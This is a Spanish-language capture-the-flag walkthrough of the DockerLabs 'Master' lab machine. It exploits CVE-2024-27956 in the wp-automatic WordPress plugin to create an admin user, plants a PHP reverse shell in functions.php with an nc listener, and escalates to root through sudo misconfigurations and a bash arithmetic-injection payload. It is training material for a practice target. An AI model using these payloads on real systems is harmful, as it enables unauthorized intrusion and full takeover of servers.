---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Master DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip master.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh master.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 11:53 EST
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: WordPress 6.5.5
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Master
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds
```

Si vamos a la pagina web, veremos una pagina normal, pero si nos vamos al `footer` veremos lo siguiente:

```
Created by Master 2024 && Automated By wp-automatic 3.92.0 
```

Vemos que esta utilizando `worpress` y esto puede ser un plugin, que encima nos confirma con una version en especifico, por lo que si buscamos algun `exploit` asociado a dicho plugin, podremos encontrar el siguiente `exploit`.

URL = [Exploit CVE-2024-27956-RCE](https://github.com/diego-tella/CVE-2024-27956-RCE)

Una vez que nos hayamos descargado el script, lo ejecutamos de la siguiente forma:

```shell
python3 exploit.py http://172.17.0.2/
```

Info:

```
[+] Exploit for CVE-2024-27956
[+] Creating user eviladmin
[+] Giving eviladmin administrator permissions
[+] Exploit completed!
[+] administrator created: eviladmin:admin
```

Vemos que ha funcionado y nos ha creado un usuario en `worpress` como administrador con las siguiente credenciales:

```
User: eviladmin
Pass: admin
```

Ahora si nos vamos a `/wp-admin` que es donde estara el login y metemos dichas credenciales, veremos que estamos dentro.

## Escalate user www-data

Nos iremos a `Appearance` -> `Theme File Editor` -> `functions.php`

Dentro de este carchivo pegaremos nuestra `reverse shell`:

```php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Y antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora tendremos que pulsar en `Update File`, veremos que nos da un error, pero si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 48182
whoami
www-data
```

Vemos que hemos obtenido acceso como el usuario `www-data`, pero antes sanitizaremos la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user pylon

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 0563443ab229:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 0563443ab229:
    (pylon) NOPASSWD: /usr/bin/php
```

Vemos que podemos ejecutar el binario `php` como el usuario `pylon`, por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
sudo -u pylon php -r "system('$CMD');"
```

Info:

```
pylon@0563443ab229:/home$ whoami
pylon
```

Vemos que con esto seremos dicho usuario.

## Escalate user mario

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for pylon on 0563443ab229:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pylon may run the following commands on 0563443ab229:
    (mario) NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
```

Vemos que podemos ejecutar el binario `bash` junto con el script `.sh` como el usuario `mario` por lo que vamos a ver que contiene el script.

No podremos leerlo, pero vemos lo que parece ser una copia de ese script en esta ubicacion:

```shell
cat /home/pylon/pylonsorpresita.sh
```

Info:

```bash
#!/bin/bash

read -rp "Escribe 1 para ver el canal de pylon: " num

if [[ $num -eq 1 ]]
then    
  echo "https://www.youtube.com/@Pylonet"
else    
  echo "Ingresa el 1"
fi
```

Vemos que puede contener una vulnerabilidad en esta linea:

```bash
if [[ $num -eq 1 ]]
```

Por lo que podremos hacer lo siguiente:

```shell
sudo -u mario bash /home/mario/pingusorpresita.sh
test[$(/bin/bash >&2)]+1
```

Info:

```
mario@0563443ab229:/home/pylon$ whoami
mario
```

Y con esto seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mario on 0563443ab229:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mario may run the following commands on 0563443ab229:
    (root) NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
```

Vemos que podemos ejecutar lo mismo de antes, pero esta vez como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo bash /home/pylon/pylonsorpresita.sh
test[$(/bin/bash >&2)]+1
```

Info:

```
root@0563443ab229:/home/pylon# whoami
root
```

Con esto seremos el usuario `root`, por lo que habremos termiando la maquina.
